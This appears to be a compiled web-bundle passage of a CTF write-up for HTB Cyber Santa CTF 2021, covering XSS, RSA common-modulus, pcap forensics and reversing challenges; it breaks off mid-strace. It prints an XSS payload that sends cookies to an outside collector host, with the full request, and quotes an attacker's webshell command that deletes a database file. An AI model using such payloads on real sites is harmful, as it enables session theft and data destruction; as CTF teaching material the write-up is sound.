"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8295],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>m});var a=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function l(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?l(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):l(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},l=Object.keys(e);for(a=0;a<l.length;a++)t=l[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)t=l[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var s=a.createContext({}),c=function(e){var n=a.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},p=function(e){var n=c(e.components);return a.createElement(s.Provider,{value:n},e.children)},d="mdxType",f={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},u=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,l=e.originalType,s=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),d=c(t),u=r,m=d["".concat(s,".").concat(u)]||d[u]||f[u]||l;return t?a.createElement(m,o(o({ref:n},p),{},{components:t})):a.createElement(m,o({ref:n},p))}));function m(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var l=t.length,o=new Array(l);o[0]=u;var i={};for(var s in n)hasOwnProperty.call(n,s)&&(i[s]=n[s]);i.originalType=e,i[d]="string"==typeof e?e:r,o[1]=i;for(var c=2;c<l;c++)o[c]=t[c];return a.createElement.apply(null,o)}return a.createElement.apply(null,t)}u.displayName="MDXCreateElement"},61057:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>o,default:()=>f,frontMatter:()=>l,metadata:()=>i,toc:()=>c});var a=t(87462),r=(t(67294),t(3905));const l={layout:"post",title:"HTB Cyber Santa CTF 2021 - Write-up",lang:"en",categories:["writeups"],tags:["security","writeups","ctf","web"],date:"2021/12/05",thumbnail:"/images/ctf.png"},o=void 0,i={unversionedId:"HackTheBox/CyberSantaCTF/2021/write-up",id:"HackTheBox/CyberSantaCTF/2021/write-up",title:"HTB Cyber Santa CTF 2021 - Write-up",description:"\ud83d\udca2 Info",source:"@site/writeups/HackTheBox/CyberSantaCTF/2021/write-up.md",sourceDirName:"HackTheBox/CyberSantaCTF/2021",slug:"/HackTheBox/CyberSantaCTF/2021/write-up",permalink:"/writeups/HackTheBox/CyberSantaCTF/2021/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"ctf",permalink:"/writeups/tags/ctf"},{label:"web",permalink:"/writeups/tags/web"}],version:"current",frontMatter:{layout:"post",title:"HTB Cyber Santa CTF 2021 - Write-up",lang:"en",categories:["writeups"],tags:["security","writeups","ctf","web"],date:"2021/12/05",thumbnail:"/images/ctf.png"},sidebar:"tutorialSidebar",previous:{title:"Control ",permalink:"/writeups/HackTheBox/Control/write-up"},next:{title:"Delivery ",permalink:"/writeups/HackTheBox/Delivery/write-up"}},s={},c=[{value:"\ud83d\udca2 Info",id:"-info",level:2},{value:"Version",id:"version",level:3},{value:"CTF",id:"ctf",level:3},{value:"Day 1 - 01/12/2021",id:"day-1---01122021",level:2},{value:"Toy Workshop - Web",id:"toy-workshop---web",level:3},{value:"Source code analysis",id:"source-code-analysis",level:4},{value:"XSS - Cookie grabbing",id:"xss---cookie-grabbing",level:4},{value:"Common Mistake - Crypto",id:"common-mistake---crypto",level:3},{value:"baby APT - Forensics",id:"baby-apt---forensics",level:3},{value:"Mr Snowy - Pwn",id:"mr-snowy---pwn",level:3},{value:"Infiltration - Reversing",id:"infiltration---reversing",level:3},{value:"Day 2 - 02/12/2021",id:"day-2---02122021",level:2},{value:"Toy Management - Web",id:"toy-management---web",level:3},{value:"Source code analysis",id:"source-code-analysis-1",level:4},{value:"Exploitation: SQL injection",id:"exploitation-sql-injection",level:4},{value:"XMAS Spirit - Crypto",id:"xmas-spirit---crypto",level:3},{value:"Honeypot - Forensics",id:"honeypot---forensics",level:3},{value:"Gift Wrapping - Reversing",id:"gift-wrapping---reversing",level:3},{value:"Naive approach",id:"naive-approach",level:4},{value:"Elegant approach",id:"elegant-approach",level:4},{value:"Sleigh - Pwn",id:"sleigh---pwn",level:3},{value:"Day 3 - 03/12/2021",id:"day-3---03122021",level:2},{value:"Gadget Santa - Web",id:"gadget-santa---web",level:3},{value:"Source code review",id:"source-code-review",level:4},{value:"Exploitation: security bypass",id:"exploitation-security-bypass",level:4},{value:"Naughty List - Pwn",id:"naughty-list---pwn",level:3},{value:"Missing Reindeer - Crypto",id:"missing-reindeer---crypto",level:3},{value:"Intercept - Reversing",id:"intercept---reversing",level:3},{value:"Persist - Forensics",id:"persist---forensics",level:3},{value:"Day 4 - 04/12/2021",id:"day-4---04122021",level:2},{value:"Elf Directory - Web",id:"elf-directory---web",level:3},{value:"Cookie manipulation",id:"cookie-manipulation",level:4},{value:"Upload",id:"upload",level:4},{value:"Minimelfistic - Pwn",id:"minimelfistic---pwn",level:3},{value:"Meet Me Halfway - Crytpo",id:"meet-me-halfway---crytpo",level:3},{value:"Upgraded - Reversing",id:"upgraded---reversing",level:3},{value:"Giveaway - Forensics",id:"giveaway---forensics",level:3},{value:"Day 5 - 05/12/2021",id:"day-5---05122021",level:2},{value:"Naughty or Nice - Web",id:"naughty-or-nice---web",level:3},{value:"Music Notes - Pwn",id:"music-notes---pwn",level:3},{value:"Warehouse Maintenance - Crypto",id:"warehouse-maintenance---crypto",level:3},{value:"Bamboozled - Reversing",id:"bamboozled---reversing",level:3},{value:"Ho Ho Ho - Forensics",id:"ho-ho-ho---forensics",level:3}],p={toc:c},d="wrapper";function f(e){let{components:n,...t}=e;return(0,r.kt)(d,(0,a.Z)({},p,t,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h2",{id:"-info"},"\ud83d\udca2 Info"),(0,r.kt)("h3",{id:"version"},"Version"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"By"),(0,r.kt)("th",{parentName:"tr",align:null},"Version"),(0,r.kt)("th",{parentName:"tr",align:null},"Comment"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"cyfun"),(0,r.kt)("td",{parentName:"tr",align:null},"1.0"),(0,r.kt)("td",{parentName:"tr",align:null},"Creation")))),(0,r.kt)("h3",{id:"ctf"},"CTF"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name")," : HTB Cyber Santa CTF 2021"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Website")," : ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.com/events/santa-needs-your-help"},"hackthebox.com")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Type")," : Online"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Format")," : Jeopardy"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"CTF Time")," : ",(0,r.kt)("a",{parentName:"li",href:"https://ctftime.org/event/1523/"},"link"))),(0,r.kt)("h2",{id:"day-1---01122021"},"Day 1 - 01/12/2021"),(0,r.kt)("h3",{id:"toy-workshop---web"},"Toy Workshop - Web"),(0,r.kt)("h4",{id:"source-code-analysis"},"Source code analysis"),(0,r.kt)("p",null,"We can download and review the source code of the app."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ tree web_toy_workshop\n\u251c\u2500\u2500 build-docker.sh\n\u251c\u2500\u2500 challenge\n\u2502   \u251c\u2500\u2500 bot.js\n\u2502   \u251c\u2500\u2500 database.js\n\u2502   \u251c\u2500\u2500 index.js\n\u2502   \u251c\u2500\u2500 package.json\n\u2502   \u251c\u2500\u2500 routes\n\u2502   \u2502   \u2514\u2500\u2500 index.js\n\u2502   \u251c\u2500\u2500 static\n\u2502   \u2502   \u251c\u2500\u2500 audio\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 audio.mp3\n\u2502   \u2502   \u251c\u2500\u2500 css\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 bootstrap.min.css\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 dashboard.css\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 index.css\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 remodal.css\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 remodal-default-theme.css\n\u2502   \u2502   \u251c\u2500\u2500 images\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 ballset.png\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 ballset.png~\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 bayblade.png~\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 bearset.png\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 bearset.png~\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 bin2.png\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 bin2.png~\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 cflower.png\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 elf1.png\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 elf2.png\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 gameset.png\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 gameset.png~\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 logo.png\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 santa-loading.gif\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 sign_post.png\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 trainset.png\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 trainset.png~\n\u2502   \u2502   \u2514\u2500\u2500 js\n\u2502   \u2502       \u251c\u2500\u2500 bootstrap.min.js\n\u2502   \u2502       \u251c\u2500\u2500 conveyor.js\n\u2502   \u2502       \u251c\u2500\u2500 index.js\n\u2502   \u2502       \u251c\u2500\u2500 jquery-3.6.0.min.js\n\u2502   \u2502       \u2514\u2500\u2500 remodal.min.js\n\u2502   \u2514\u2500\u2500 views\n\u2502       \u251c\u2500\u2500 index.hbs\n\u2502       \u2514\u2500\u2500 queries.hbs\n\u251c\u2500\u2500 config\n\u2502   \u2514\u2500\u2500 supervisord.conf\n\u2514\u2500\u2500 Dockerfile\n\n9 directories, 38 files\n")),(0,r.kt)("p",null,"By reading ",(0,r.kt)("inlineCode",{parentName:"p"},"/challenge/routes/index.js")," we can find the routes of the app."),(0,r.kt)("p",null,"The two routes that are interesting are the following:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},"router.post('/api/submit', async (req, res) => {\n\n    const { query } = req.body;\n    if(query){\n      return db.addQuery(query)\n        .then(() => {\n          bot.readQueries(db);\n          res.send(response('Your message is delivered successfully!'));\n        });\n    }\n    return res.status(403).send(response('Please write your query first!'));\n});\n\nrouter.get('/queries', async (req, res, next) => {\n  if(req.ip != '127.0.0.1') return res.redirect('/');\n\n  return db.getQueries()\n    .then(queries => {\n      res.render('queries', { queries });\n    })\n    .catch(() => res.status(500).send(response('Something went wrong!')));\n});\n")),(0,r.kt)("p",null,"Also the following chunk of code in ",(0,r.kt)("inlineCode",{parentName:"p"},"/challenge/bot.js")," allow us to understand\nthat a bot will consult the queries page."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},"const readQueries = async (db) => {\n    const browser = await puppeteer.launch(browser_options);\n    let context = await browser.createIncognitoBrowserContext();\n    let page = await context.newPage();\n    await page.goto('http://127.0.0.1:1337/');\n    await page.setCookie(...cookies);\n    await page.goto('http://127.0.0.1:1337/queries', {\n      waitUntil: 'networkidle2'\n    });\n    await browser.close();\n    await db.migrate();\n};\n")),(0,r.kt)("p",null,"We can't browse the ",(0,r.kt)("inlineCode",{parentName:"p"},"/queries")," endpoint directly because it can be viewed only\nfrom localhost. So we have to submit a query to the API and wait for the bot\nto browse it. We see that the bot as a cookie containing the flag so our goal\nwill be to steal that cookie."),(0,r.kt)("h4",{id:"xss---cookie-grabbing"},"XSS - Cookie grabbing"),(0,r.kt)("p",null,"This JavaScript payload will retrieve unprotected cookies and make a request\nto an attacker controlled endpoint to exfiltrate the cookie."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'<script>new Image().src="https://hookb.in/Mq2WRx6kojSDRWppRMgo/?c="+document.cookie;<\/script>\n')),(0,r.kt)("p",null,"Query:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-http"},'POST /api/submit HTTP/1.1\nHost: 178.128.35.31:30621\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://178.128.35.31:30621/\nContent-Type: application/json\nOrigin: http://178.128.35.31:30621\nContent-Length: 107\nConnection: close\n\n{"query":"<script>new Image().src=\\"https://hookb.in/Mq2WRx6kojSDRWppRMgo/?c=\\"+document.cookie;<\/script>"}\n')),(0,r.kt)("p",null,"Retrieved cookie:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"flag=HTB{3v1l_3lv3s_4r3_r1s1ng_up!}\n")),(0,r.kt)("h3",{id:"common-mistake---crypto"},"Common Mistake - Crypto"),(0,r.kt)("p",null,"It looks like RSA parameters and cipher text encoded in hexadecimal."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x10001', 'ct': '0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874'}\n{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x23', 'ct': '0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208'}\n")),(0,r.kt)("p",null,"We can convert the hexadecimal to decimal with ",(0,r.kt)("a",{parentName:"p",href:"https://cyfun.github.io/ctf-party"},"ctf-party"),".\nFor example:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},"irb(main):002:0> '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef'.hex2dec(prefix: '0x')\n=> \"21388731509885000178627064516258054470260331371598943108291856742436111736828979864010924669228672392691259110152052179841234423220373839350729519449867096270377366080249815393746878871366061153796079471618562067885157333408378773203102328726963273544788844541658368239189745882391132838451159906995037703318134437625750463265571575001855682002307507556141914223053440116920635522540306152978955166077383503077296996797116492665606386925464305499727852298454712455680910133707466125522128546462287576144499756117801116464261543533542827392699481765864054797509983998681705356909524163419157085924159390221747612487407\"\nirb(main):002:0> '0x23'.hex2dec(prefix: '0x')\n=> \"35\"\nirb(main):001:0> '0x10001'.hex2dec(prefix: '0x')\n=> \"65537\"\nirb(main):001:0> '0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874'.hex2dec(prefix: '0x')\n=> \"10832767136661619622293208748444962392355211301390434120939858183061348121126484914263671262032603875084667844823015664447375648718327494489656817860025737727356822703892293211022320699697919627907394583787345038714333739600698382532854618636094930253033489471351451429607353151015568123268427367950348329135569722792929241394325167453525160818746481257803112384890621897151307914147207385945644054978785846514561379487923125221730977998641404608153621221989242862072038048891093337039913905830269768414927334743978508494831586214464123847828971941221037875260516473982025116976142753481691811417555124564400023181428\"\nirb(main):002:0> '0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208'.hex2dec(prefix: '0x')\n=> \"15339581512280546253022387613330506135473528946217386214104392886174532962135139018179028980415602501799731665623533337161466343141774695260798342966907592969192136730428838101668117599627074424456369362732331025534652310626217911372168741784410233370188819015541694457313359727564553135243865091813543574169503409997765186767976316668351998243685484183615633052413572395870658899189135714137152486690320920884963915388873421509027812888500063744545503640233833759600980489533968220839778372130766115290961393758948141655306677776381429819578626575875511596616706688649422193432129579216085481063417748767088461582856\"\n")),(0,r.kt)("p",null,"Let's conduct a Common Modulus Attack with RSHack. Here the install instruction\nfor BlackArch Linux."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ sudo pacman -S rshack\n")),(0,r.kt)("p",null,"Attack:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ rshack\n\n\n                #########################\n                #      RSHack v2.1      #\n                #      Zweisamkeit      #\n                #      GNU GPL v3       #\n                #########################\n\n\n\n        List of the available attacks:\n\n                1. Wiener Attack\n                2. Hastad Attack\n                3. Fermat Attack\n                4. Bleichenbacher Attack\n                5. Common Modulus Attack\n                6. Chosen Plaintext Attack\n\n        List of the available tools:\n\n                a. RSA Public Key parameters extraction\n                b. RSA Private Key parameters extraction\n                c. RSA Private Key construction (PEM)\n                d. RSA Public Key construction (PEM)\n                e. RSA Ciphertext Decipher\n                f. RSA Ciphertext Encipher\n\n        [*] What attack or tool do you want to carry out? 5\n\n                         ***** Common Modulus Attack *****\n\n                [*] Arguments [-h] -n common modulus -e1 first exponent -e2 second exponent -c1 first cipher -c2 second cipher:\n\n                        -n 21388731509885000178627064516258054470260331371598943108291856742436111736828979864010924669228672392691259110152052179841234423220373839350729519449867096270377366080249815393746878871366061153796079471618562067885157333408378773203102328726963273544788844541658368239189745882391132838451159906995037703318134437625750463265571575001855682002307507556141914223053440116920635522540306152978955166077383503077296996797116492665606386925464305499727852298454712455680910133707466125522128546462287576144499756117801116464261543533542827392699481765864054797509983998681705356909524163419157085924159390221747612487407 -e1 65537 -e2 35 -c1 10832767136661619622293208748444962392355211301390434120939858183061348121126484914263671262032603875084667844823015664447375648718327494489656817860025737727356822703892293211022320699697919627907394583787345038714333739600698382532854618636094930253033489471351451429607353151015568123268427367950348329135569722792929241394325167453525160818746481257803112384890621897151307914147207385945644054978785846514561379487923125221730977998641404608153621221989242862072038048891093337039913905830269768414927334743978508494831586214464123847828971941221037875260516473982025116976142753481691811417555124564400023181428 -c2 15339581512280546253022387613330506135473528946217386214104392886174532962135139018179028980415602501799731665623533337161466343141774695260798342966907592969192136730428838101668117599627074424456369362732331025534652310626217911372168741784410233370188819015541694457313359727564553135243865091813543574169503409997765186767976316668351998243685484183615633052413572395870658899189135714137152486690320920884963915388873421509027812888500063744545503640233833759600980489533968220839778372130766115290961393758948141655306677776381429819578626575875511596616706688649422193432129579216085481063417748767088461582856\n\n\n                ~~~~~~~~~~~~~~~~~~~~~~~~~\n                  Common Modulus Attack\n                       Zweisamkeit\n                    GNU GPL v3 License\n                ~~~~~~~~~~~~~~~~~~~~~~~~~\n\n\n        [+] Decimal plaintext:  154494104151501230741951698942733388017524925426108770319061863579333462036794337421344018523054973\n\n        [+] Interpreted plaintext:  HTB{c0mm0n_m0d_4774ck_15_4n07h3r_cl4ss1c}\n")),(0,r.kt)("h3",{id:"baby-apt---forensics"},"baby APT - Forensics"),(0,r.kt)("p",null,"It's a network forensics challenge where we'll have to analyse the captured\ntraffic recorded in a pcap."),(0,r.kt)("p",null,"We can filtrer on HTTP frames or use the Export HTTP object feature."),(0,r.kt)("p",null,"A webshell named ",(0,r.kt)("inlineCode",{parentName:"p"},"bg.php")," is access several times and the attacker is sending commands\nto it."),(0,r.kt)("p",null,"One of the commands seems obfuscated, but ",(0,r.kt)("a",{parentName:"p",href:"https://cyfun.github.io/ctf-party"},"ctf-party"),"\ncan once again help us to decode the URL components and base64 decode it."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ctf-party 'cmd=rm++%2Fvar%2Fwww%2Fhtml%2Fsites%2Fdefault%2Ffiles%2F.ht.sqlite+%26%26+echo+SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59+%3E+%2Fdev%2Fnull+2%3E%261+%26%26+ls+-al++%2Fvar%2Fwww%2Fhtml%2Fsites%2Fdefault%2Ffiles' urldecode\ncmd=rm  /var/www/html/sites/default/files/.ht.sqlite && echo SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59 > /dev/null 2>&1 && ls -al  /var/www/html/sites/default/files\n$ ctf-party 'SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59' from_b64\nHTB{0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n}\n")),(0,r.kt)("h3",{id:"mr-snowy---pwn"},"Mr Snowy - Pwn"),(0,r.kt)("p",null,"I didn't do it."),(0,r.kt)("h3",{id:"infiltration---reversing"},"Infiltration - Reversing"),(0,r.kt)("p",null,"Just tracing the syscall made when connecting to a remote socket we can make\nthe flag leak:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ strace rev_infiltration/client 178.128.46.48 32124\nexecve("rev_infiltration/client", ["rev_infiltration/client", "178.128.46.48", "32124"], 0x7ffe28abc7d0 /* 65 vars */) = 0\nbrk(NULL)                               = 0x5621147dd000\narch_prctl(0x3001 /* ARCH_??? */, 0x7ffeacdfa870) = -1 EINVAL (Invalid argument)\naccess("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)\nopenat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3\nnewfstatat(3, "", {st_mode=S_IFREG|0644, st_size=149796, ...}, AT_EMPTY_PATH) = 0\nmmap(NULL, 149796, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f149bc68000\nclose(3)                                = 0\nopenat(AT_FDCWD, "/usr/lib/libc.so.6", O_RDONLY|O_CLOEXEC) = 3\nread(3, "\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0`|\\2\\0\\0\\0\\0\\0"..., 832) = 832\npread64(3, "\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0"..., 784, 64) = 784\npread64(3, "\\4\\0\\0\\0@\\0\\0\\0\\5\\0\\0\\0GNU\\0\\2\\0\\0\\300\\4\\0\\0\\0\\3\\0\\0\\0\\0\\0\\0\\0"..., 80, 848) = 80\npread64(3, "\\4\\0\\0\\0\\24\\0\\0\\0\\3\\0\\0\\0GNU\\0K@g7\\5w\\10\\300\\344\\306B4Zp<G"..., 68, 928) = 68\nnewfstatat(3, "", {st_mode=S_IFREG|0755, st_size=2150424, ...}, AT_EMPTY_PATH) = 0\nmmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f149bc66000\npread64(3, "\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0"..., 784, 64) = 784\nmmap(NULL, 1880536, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f149ba9a000\nmmap(0x7f149bac0000, 1355776, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x26000) = 0x7f149bac0000\nmmap(0x7f149bc0b000, 311296, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x171000) = 0x7f149bc0b000\nmmap(0x7f149bc57000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bc000) = 0x7f149bc57000\nmmap(0x7f149bc5d000, 33240, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f149bc5d000\nclose(3)                                = 0\nmmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f149ba98000\narch_prctl(ARCH_SET_FS, 0x7f149bc67580) = 0\nmprotect(0x7f149bc57000, 12288, PROT_READ) = 0\nmprotect(0x562114482000, 4096, PROT_READ) = 0\nmprotect(0x7f149bcbb000, 8192, PROT_READ) = 0\nmunmap(0x7f149bc68000, 149796)          = 0\nsocket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3\nconnect(3, 